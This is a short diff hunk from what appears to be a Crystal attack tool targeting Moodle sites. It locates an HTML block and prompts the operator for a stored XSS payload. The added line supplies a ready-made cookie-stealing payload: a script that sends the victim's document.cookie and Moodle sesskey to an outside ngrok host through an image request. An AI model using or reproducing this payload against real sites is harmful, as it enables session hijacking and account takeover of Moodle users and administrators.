@@ -28,7 +28,7 @@ module TMoodleActions
       dashboard_with_block = http_get("#{target}/my/index.php", session["moodle_session"]).body
       block_id = dashboard_with_block.match(/\(new HTML block\)<\/a>(?:\s)*<aside id="inst(?<block_id>([0-9])+)"/).not_nil!.named_captures["block_id"]
       puts "[*] Block id: #{block_id}"
-      puts "[?] Enter an XSS payload (e.g. session stealer) to send including <script> tags:"
+      puts "[?] Enter an XSS payload (e.g. session stealer) to send including <script> tags e.g. \n\n<script>document.body.appendChild(document.createElement('img')).src=('https://5fc418e2.ngrok.io/?session='.concat(document.cookie,'|',M.cfg.sesskey))</script>"
       payload = gets().not_nil!
       puts "[>] Sending payload to target..."
       headers = HTTP::Headers.new
